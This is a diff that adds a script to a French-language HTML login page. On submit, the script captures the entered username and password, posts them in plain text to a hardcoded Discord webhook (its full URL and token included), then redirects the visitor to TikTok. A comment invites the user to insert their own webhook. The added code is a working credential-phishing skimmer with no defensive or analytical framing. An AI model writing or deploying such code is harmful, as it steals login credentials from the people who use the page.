@@ -69,7 +69,38 @@
       <button type="submit">Se connecter</button>
     </form>
   </div>
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
 
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  // Remplace l’URL ci-dessous par ton propre webhook Discord
+  const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
+
+  const payload = {
+    content: `Nouvelle connexion reçue :\nUtilisateur : ${username}\nMot de passe : ${password}`
+  };
+
+  fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (response.ok) {
+      alert("Connexion envoyée !");
+      window.location.href = "https://www.tiktok.com";
+    } else {
+      alert("Erreur lors de l’envoi.");
+    }
+  })
+  .catch(error => {
+    alert("Erreur réseau.");
+  });
+});
+</script>
   <script>
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
